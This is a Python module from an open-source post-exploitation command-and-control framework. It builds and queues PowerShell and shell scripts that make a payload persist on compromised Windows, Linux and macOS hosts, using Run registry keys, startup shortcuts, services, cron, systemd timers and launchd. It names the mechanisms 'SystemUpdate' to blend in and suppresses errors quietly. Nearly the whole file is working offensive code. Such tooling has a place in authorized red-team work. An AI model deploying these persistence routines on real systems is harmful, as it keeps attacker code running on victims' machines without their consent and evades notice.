"""
The Neo C2 Framework is a post-exploitation command and control framework.

This file is part of Neo C2 Framework.
Copyright (C) 2025 @stillbigjosh

The Neo C2 Framework of this edition is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

The Neo C2 Framework is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Neo.  If not, see <http://www.gnu.org/licenses/>
"""

# modules/persistence.py
import os
import json
import base64
import uuid
from datetime import datetime

def get_info():
    return {
        "name": "persist",
        "description": "Establish persistence on Windows, Linux, or macOS systems",
        "type": "multi-platform",
        "technique_id": "T1547,T1053",
        "mitre_tactics": ["Persistence", "Privilege Escalation"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to establish persistence on",
                "required": True
            },
            "method": {
                "description": "Persistence method: registry, startup, cron, launchd, systemd, or service",
                "required": True
            },
            "payload_path": {
                "description": "Path to the payload/script to persist",
                "required": True
            },
            "name": {
                "description": "Name for the persistence mechanism",
                "required": False,
                "default": "SystemUpdate"
            },
            "interval": {
                "description": "Interval for scheduled tasks (minutes, only for cron/systemd)",
                "required": False,
                "default": "60"
            }
        }
    }

def execute(options, session):
    agent_id = options.get("agent_id")
    method = options.get("method")
    payload_path = options.get("payload_path")
    name = options.get("name", "SystemUpdate")
    interval = options.get("interval", "60")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if not method:
        return {
            "success": False,
            "error": "method is required. Options: registry, startup, cron, launchd, systemd, service"
        }
    
    if not payload_path:
        return {
            "success": False,
            "error": "payload_path is required"
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    
    # Generate platform-specific persistence code
    if method == "registry":
        code = _generate_registry_persistence(payload_path, name)
    elif method == "startup":
        code = _generate_startup_persistence(payload_path, name)
    elif method == "cron":
        code = _generate_cron_persistence(payload_path, name, interval)
    elif method == "launchd":
        code = _generate_launchd_persistence(payload_path, name)
    elif method == "systemd":
        code = _generate_systemd_persistence(payload_path, name, interval)
    elif method == "service":
        code = _generate_service_persistence(payload_path, name)
    else:
        return {
            "success": False,
            "error": f"Unknown persistence method: {method}"
        }
    
    # Check if this is being executed in interactive mode
    if hasattr(session, 'is_interactive_execution') and session.is_interactive_execution:
        # Return the command that should be executed interactively
        return {
            "success": True,
            "output": f"[x] Persistence establishment prepared for interactive mode using method: {method}",
            "command": code,
            "method": method,
            "name": name
        }
    else:
        # Check if session has a valid agent_manager
        if not hasattr(session, 'agent_manager') or session.agent_manager is None:
            return {
                "success": False,
                "error": "Session does not have an initialized agent_manager"
            }

        # Queue the task on the agent
        try:
            agent_manager = session.agent_manager
            task_id = agent_manager.add_task(agent_id, code)
            if task_id:
                return {
                    "success": True,
                    "output": f"[x] Persistence task {task_id} queued for agent {agent_id} using method: {method}",
                    "task_id": task_id,
                    "method": method,
                    "name": name
                }
            else:
                return {
                    "success": False,
                    "error": f"Failed to queue task for agent {agent_id}"
                }
        except Exception as e:
            return {
                "success": False,
                "error": f"Error queuing task: {str(e)}"
            }

def _generate_registry_persistence(payload_path, name):
    return f'''
$payloadPath = "{payload_path}"
$name = "{name}"

try {{
    $runKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $runKey -Name $name -Value $payloadPath -ErrorAction Stop

    $value = Get-ItemProperty -Path $runKey -Name $name -ErrorAction SilentlyContinue
    if ($value) {{
    }} else {{
    }}
}} catch {{
    try {{
        $runOnceKey = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        Set-ItemProperty -Path $runOnceKey -Name $name -Value $payloadPath -ErrorAction Stop
    }} catch {{
    }}
}}
'''

def _generate_startup_persistence(payload_path, name):
    return f'''
$payloadPath = "{payload_path}"
$name = "{name}"

try {{
    $startupFolder = [Environment]::GetFolderPath('Startup')
    $lnkPath = Join-Path $startupFolder "$name.lnk"

    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = $payloadPath
    $shortcut.WorkingDirectory = Split-Path $payloadPath
    $shortcut.Description = "$name Service"
    $shortcut.Save()

    if (Test-Path $lnkPath) {{
    }} else {{
    }}
}} catch {{
}}
'''

def _generate_cron_persistence(payload_path, name, interval):
    return f'''
payload_path="{payload_path}"
name="{name}"
interval="{interval}"

cron_interval="*/$interval * * * *"

cron_entry="$cron_interval $payload_path # $name"

if crontab -l 2>/dev/null | grep -q "$name"; then
    :
else
    (crontab -l 2>/dev/null; echo "$cron_entry" 2>/dev/null) | crontab -

    if [ $? -eq 0 ]; then
        crontab -l | grep "$name" 2>/dev/null > /dev/null
    else
        :
    fi
fi

if [ "$(id -u)" -eq 0 ]; then
    cron_file="/etc/cron.d/$name"
    echo "$cron_interval root $payload_path" > "$cron_file" 2>/dev/null
    chmod 644 "$cron_file"
fi
'''

def _generate_launchd_persistence(payload_path, name):
    return f'''
payload_path="{payload_path}"
name="{name}"

if [ "$(id -u)" -eq 0 ]; then
    plist_dir="/Library/LaunchDaemons"
    label="com.system.$name"
else
    plist_dir="$HOME/Library/LaunchAgents"
    label="com.user.$name"
fi

plist_file="$plist_dir/$label.plist"

mkdir -p "$plist_dir"

cat > "$plist_file" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$label</string>
    <key>ProgramArguments</key>
    <array>
        <string>$payload_path</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/$name.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/$name.err</string>
</dict>
</plist>
EOF

chmod 644 "$plist_file"

if launchctl load "$plist_file" 2>/dev/null; then
    :
else
    launchctl bootstrap gui/$(id -u) "$plist_file" 2>/dev/null
    :
fi

if launchctl list | grep -q "$label"; then
    :
else
    :
fi
'''

def _generate_systemd_persistence(payload_path, name, interval):
    return f'''
payload_path="{payload_path}"
name="{name}"
interval="{interval}"

if [ "$(id -u)" -eq 0 ]; then
    service_dir="/etc/systemd/system"
    systemctl_cmd="systemctl"
else
    service_dir="$HOME/.config/systemd/user"
    systemctl_cmd="systemctl --user"
    mkdir -p "$service_dir"
fi

service_file="$service_dir/$name.service"
timer_file="$service_dir/$name.timer"

cat > "$service_file" << EOF
[Unit]
Description=$name Service
After=network.target

[Service]
Type=simple
ExecStart=$payload_path
Restart=on-failure
RestartSec=10

[Install]
WantedBy=default.target
EOF

cat > "$timer_file" << EOF
[Unit]
Description=$name Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=${{interval}}min
Unit=$name.service

[Install]
WantedBy=timers.target
EOF

$systemctl_cmd daemon-reload

$systemctl_cmd enable "$name.timer"
$systemctl_cmd start "$name.timer"

if $systemctl_cmd is-enabled "$name.timer" 2>/dev/null; then
    $systemctl_cmd status "$name.timer" --no-pager 2>/dev/null
else
    :
fi
'''

def _generate_service_persistence(payload_path, name):
    return f'''
$payloadPath = "{payload_path}"
$serviceName = "{name}"

try {{
    $existingService = Get-Service -Name $serviceName -ErrorAction SilentlyContinue

    if ($existingService) {{
        Stop-Service -Name $serviceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $serviceName
        Start-Sleep -Seconds 2
    }}

    $result = sc.exe create $serviceName binPath= "$payloadPath" start= auto DisplayName= "$serviceName Service"

    if ($LASTEXITCODE -eq 0) {{
        sc.exe description $serviceName "System Update Service"
        Start-Service -Name $serviceName -ErrorAction SilentlyContinue

        $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
        if ($service) {{
        }} else {{
        }}
    }} else {{
    }}
}} catch {{
}}
'''


